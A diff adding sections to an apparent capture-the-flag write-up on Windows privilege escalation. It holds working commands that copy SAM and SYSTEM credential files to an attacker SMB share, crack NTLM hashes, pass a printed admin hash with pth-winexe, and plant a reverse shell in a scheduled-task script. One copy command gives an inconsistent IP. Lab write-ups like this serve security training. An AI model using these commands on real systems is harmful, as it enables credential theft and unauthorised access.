@@ -406,31 +406,132 @@ runas /savecred /user:admin C:\PrivEsc\reverse.exe
 
 ### Passwords - Security Account Manager (SAM)
 
-
+In the SAM and SYSTEM files, user credential hashes are stored. If these are insecurely backed-up we might be able to copy these files and dump the hashes.
 
 1. What is the NTLM hash of the admin user?
    
+   First setup an smb server if not already present on our machine.
    
+   ```cmd
+   sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .     
+   ```
+   
+   ![SMB Server](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/SAM_Smb_Server.png)
+   
+   Looking at the directory, we can indeed see the two backup files there.
+   
+   ![Backup Files](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/SAM_Insecure_Backup_Files.png)
+   
+   Copy them to the attacking machine.
+   
+   ```cmd
+   copy C:\Windows\Repair\SAM \\10.18.78.136\kali\SAM
+   copy C:\Windows\Repair\SYSTEM \\18.78.136.10\kali\SYSTEM
+   ```
+   
+   ![Copy Files](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/SAM_Copy_Files.png)
+   
+   Use creddump7 to dump the hashes from these files using:
+   
+   ```cmd
+   python3 /usr/share/creddump7/pwdump.py SYSTEM SAM
+   ```
+   
+   ![User Hashes](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/SAM_User_Hashes.png)
+   
+   To find the passwords that belong to the hashes, we can put them in a file and use hashcat to crack them. For this part only the NLTM part is needed.
+   
+   ```cmd
+   hashcat -m 1000 privesc.hash /usr/share/wordlists/rockyou.txt
+   ```
+   
+   ![Cracked Passwords](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/SAM_Cracked_Passwords.png)
+   
+   Now we can log into the machine with the acquired credentials.
 
-   ><details><summary>Click for answer</summary></details>
+   ![Admin Login](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/SAM_Admin_Login.png)
+   
+   ><details><summary>Click for answer</summary>a9fdfa038c4b75ebc76dc855dd74f0da</details>
 
 ### Passwords - Passing the Hash
 
+Like `winexe` we can log into the machine with `pth-winexe`. The difference here is that we can do so with only the NTLM hash.
 
+*Read and follow along with the above.*
 
-Read and follow along with the above. 
+We use a similar command as with `winexe`. Here we must use both the LM as well as the NLTM part.
+
+```cmd
+pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //10.10.235.28 cmd.exe
+```
+
+![Remote Connection](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Pass_Hash_Remote_Connect.png)
 
 ### Scheduled Tasks
 
+In this task we will abuse scheduled tasks which have unnecessary permissions.
 
+*Read and follow along with the above.*
 
-Read and follow along with the above. 
+We can look at the script using:
+
+```cmd
+type C:\DevTools\CleanUp.ps1
+```
+
+Or by opening in from the GUI.
+
+![Scripts](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Scheduled_Tasks_Script.png)
+
+We can check our permission regarding this file with `accesschk` again.
+
+```cmd
+accesschk /accepteula -quvw user C:\DevTools\CleanUp.ps1
+```
+
+![Permissions](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Scheduled_Tasks_Permissions.png)
+
+Looks like we have write permission for this script. We can modify it through the GUI or CLI.
+
+```cmd
+echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
+```
+
+![Modify Scripts](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Scheduled_Tasks_Modify_Script.png)
+
+After modifying the script, we wait for the connection.
+
+![Reverse Connection](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Scheduled_Tasks_Reverse_Connection.png)
 
 ### Insecure GUI Apps
 
+In this task we will use GUI apps which are run with elevated priveleges to gain an elevated shell.
 
+*Read and follow along with the above.*
 
-Read and follow along with the above. 
+Using the paint shortcut on the desktop we open Paint as an admin user. From the shortcut target, we can see that it uses the same technique as task 10 (saved creds).
+
+![GUI Shortcut](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Insecured_GUI_Shortcut.png)
+
+After opening the file we can use Task Manager to check its user.
+
+![Task Manager](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Insecured_GUI_Task_Manager.png)
+
+This can also be done with the CLI.
+
+```cmd
+tasklist /V | findstr mspaint.exe
+```
+
+Now we can get an elevated shell by opening a file in Paint and typing the following:
+
+```cmd
+file:\C:\Windows\system32\cmd.exe
+```
+
+![Open CMD](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Insecured_GUI_Open_Cmd.png)
+
+![Elevated Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/windows10privesc/Insecured_GUI_Elevated_Shell.png)
 
 ### Startup Apps
 
